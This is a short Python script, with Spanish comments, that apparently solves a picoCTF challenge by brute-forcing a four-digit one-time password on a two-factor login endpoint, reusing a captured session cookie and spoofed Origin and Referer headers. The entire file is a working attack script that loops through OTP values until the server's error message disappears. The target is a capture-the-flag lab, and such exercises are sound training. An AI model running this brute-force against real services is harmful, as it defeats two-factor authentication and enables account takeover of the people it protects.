import requests
import time 

url = "http://foggy-cliff.picoctf.net:51620/two_fa"

# Datos del formulario extraídos del cuerpo del request (otp=1234&action=)
payload = {
    "otp": "1234",
    "action": ""
}

# La cookie de sesión que autentica la petición
cookies = {
    "session": ".eJwty0sKgCAQANC7zFoiMT94mRhyEsFRUVtFd69F2wfvhlxjpAAeTsyDQECdbR90dJofKqn1bzMxjYncwEvrrDRuNduilHTKCLgG9YJM38HAqcDzAiu2HCk.aoYFQA.fLmabv_vNCHsPzwSn9Zt3L9jJtk"
}
start = time.time()
# Cabeceras opcionales si el servidor valida el Origin/Referer
headers = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0",
    "Origin": "http://foggy-cliff.picoctf.net:50612",
    "Referer": "http://foggy-cliff.picoctf.net:50612/two_fa"
}

split=1800
st=1000+split*2
ok=False
for i in range(st,st+split):
    payload={"otp": str(i), "action": ""}
    try:
        # Enviar la petición HTTP POST
        respuesta = requests.post(url, data=payload, cookies=cookies, headers=headers)
            	
        # Evaluar el contenido devuelto por el servidor
        if "Invalid OTP or OTP expired" not in respuesta.text:
            print(f"[+] {i}")
            print(respuesta.text)
            break
            
    except requests.exceptions.RequestException as e:
        print(f"Error en la conexión: {e}")
        break
